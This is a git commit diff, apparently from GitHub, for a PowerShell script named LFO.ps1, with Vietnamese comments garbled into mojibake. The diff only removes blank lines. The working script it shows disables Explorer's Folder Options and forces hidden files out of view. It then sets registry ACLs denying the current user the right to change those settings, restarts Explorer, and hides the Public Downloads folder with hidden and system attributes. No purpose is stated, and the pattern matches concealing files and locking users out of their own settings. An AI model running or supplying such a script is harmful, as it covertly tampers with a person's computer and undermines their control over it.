7ac24e4f50c82cf6bc1a246980db1f5c2153ed26
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-06-05 11:48:08 +0700

    LFO.ps1

--- LFO.ps1
+++ LFO.ps1
@@ -1,11 +1,6 @@
-
-
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoFolderOptions" -PropertyType DWORD -Value 1 -Force
-
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -PropertyType DWORD -Value 2 -Force
-
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 2
-
 Stop-Process -Name explorer -Force
 # KhÃ³a quyá»n chá»‰nh sá»­a key 'Explorer\Advanced'
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
@@ -13,7 +8,6 @@ $acl = Get-Acl $regPath
 $rule = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)", "SetValue", "Deny")
 $acl.AddAccessRule($rule)
 Set-Acl $regPath $acl
-
 # KhÃ³a key 'Policies\Explorer'
 $regPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
 $acl2 = Get-Acl $regPath2
@@ -21,6 +15,3 @@ $rule2 = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)"
 $acl2.AddAccessRule($rule2)
 Set-Acl $regPath2 $acl2
 attrib +h +s "C:\Users\Public\Downloads"
-
-
-
